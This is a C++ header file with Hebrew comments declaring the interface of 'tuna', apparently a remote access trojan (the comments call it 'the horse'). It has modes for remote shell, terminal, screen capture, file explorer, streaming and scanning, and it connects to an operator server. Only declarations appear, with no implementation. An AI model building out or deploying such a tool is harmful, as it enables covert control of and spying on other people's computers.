#pragma once
#include "analyze.h"
#include "protocol.h"
#include "tuna_socket.h"
#include <thread>

class tuna : tuna_socket
{
public: 
	// init tuna
	tuna();

	// ---
	// start point processes
	// נקודת ההתחלה של הסוס אין חזור ממנו, במידה והתרחשה שגיאה שלא במסגרת
	// האפשרויות הסוס מת
	// ---
	void run();

	// ---
	// לאחר חיבור הסוס לשרת המפעיל (לא השרת הראשי) הסוס ימתין לחבילות מידע
	// זה ראש העץ ממנו תהליכים כבדים יעלו 
	// ---
	void proto_communication();

	// ---
	// חלק מניהול אוטומטי של הסוס 
	// ---
	void mode_ping();

	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_shell(json info);
	
	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_shell_terminal(json info);
	
	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_screen(json info);
	
	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_explorer(json info);
	
	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_streamer(json info);
	
	void del__mode_scanner();
	
	// ---
	// מעטפת לפונקציה שפירטתי בקובץ
	// modes.h
	// ---
	void mode_signal(json sig);
	
	// ---
	// ניקוי כללי 
	// deallocates reset setting and more
	// 
	// ---
	void cleanup();

private:
	int kill_me = 0;

};

